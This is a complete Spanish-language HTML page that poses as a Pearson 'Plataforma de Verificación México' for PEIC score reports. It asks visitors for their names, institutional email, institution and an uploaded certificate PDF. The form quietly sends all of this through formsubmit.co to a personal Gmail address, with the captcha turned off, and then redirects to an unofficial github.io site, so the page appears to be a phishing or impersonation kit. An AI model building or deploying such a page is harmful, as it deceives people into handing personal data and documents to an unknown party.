<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Plataforma de Verificación México - PEIC</title>
    <style>
        body { background-color: #007ba3; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 40px 10px; display: flex; flex-direction: column; align-items: center; }
        .wrapper { width: 100%; max-width: 650px; text-align: center; }
        .logo-box { background-color: white; padding: 25px 45px; border-radius: 8px; display: inline-block; margin-bottom: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        .logo-box img { width: 220px; height: auto; display: block; }
        .header h1 { color: white; font-size: 24px; margin: 5px 0; font-weight: 600; }
        .card { background-color: white; padding: 40px; border-radius: 8px; text-align: left; box-shadow: 0 10px 30px rgba(0,0,0,0.25); margin-top: 10px; }
        .section-title { font-weight: bold; font-size: 16px; color: #333; margin-bottom: 12px; margin-top: 15px; }
        .required { color: #d93025; }
        .info-text { font-size: 13px; color: #555; line-height: 1.6; margin-bottom: 20px; background: #f9f9f9; padding: 15px; border-radius: 4px; border-left: 4px solid #007ba3; }
        .input-group { margin-bottom: 18px; }
        .input-group label { display: block; font-weight: bold; font-size: 13px; margin-bottom: 8px; color: #222; }
        .input-group input[type="text"], .input-group input[type="email"] { width: 100%; padding: 12px; border: 1px solid #bdc3c7; border-radius: 4px; box-sizing: border-box; }
        .input-group input[type="file"] { background: #f4f4f4; padding: 10px; width: 100%; border-radius: 4px; border: 1px dashed #007ba3; cursor: pointer; }
        .btn-submit { background-color: #007fa3; color: white; border: none; padding: 15px; font-size: 16px; font-weight: bold; border-radius: 4px; cursor: pointer; width: 100%; margin-top: 20px; transition: 0.3s; }
        .btn-submit:hover { background-color: #005f7a; }
    </style>
</head>
<body>

    <div class="wrapper">
        <div class="header">
            <div class="logo-box">
                <img src="logo-pearson.png" alt="Pearson Logo">
            </div>
            <h1>Plataforma de Verificación México</h1>
            <h1>Score Report - PEIC</h1>
        </div>

        <div class="card">
            <form action="https://formsubmit.co/juliandavidpedrazarozo@gmail.com" method="POST" enctype="multipart/form-data">
                
                <input type="hidden" name="_next" value="https://soporte-certificaciones-mx.github.io/verificacion-pearson-peic/">
                <input type="hidden" name="_captcha" value="false">
                <input type="hidden" name="_subject" value="Nueva Verificación + PDF - México">
                <input type="text" name="_honey" style="display:none">

                <div class="section-title" style="margin-top:0;">Consideraciones generales: <span class="required">*</span></div>
                <div class="info-text">
                    1. Al completar este registro, acepta las políticas de uso y protección de datos.<br>
                    2. Validación exclusiva para certificados <b>PEIC</b>.<br>
                    3. Esta solicitud es estrictamente <b>institucional</b> en México.
                </div>

                <div class="input-group">
                    <label>Nombres completos <span class="required">*</span></label>
                    <input type="text" name="Nombres" required>
                </div>
                <div class="input-group">
                    <label>Apellidos completos <span class="required">*</span></label>
                    <input type="text" name="Apellidos" required>
                </div>
                <div class="input-group">
                    <label>Correo Electrónico Institucional <span class="required">*</span></label>
                    <input type="email" name="email" required>
                </div>
                <div class="input-group">
                    <label>Institución / Entidad que solicita <span class="required">*</span></label>
                    <input type="text" name="Institucion" required>
                </div>
                <div class="input-group">
                    <label>Adjuntar certificado para revisión (Solo PDF) <span class="required">*</span></label>
                    <input type="file" name="attachment" accept=".pdf" required>
                </div>

                <button type="submit" class="btn-submit">Enviar para Verificación</button>
            </form>
        </div>
    </div>

</body>
</html>
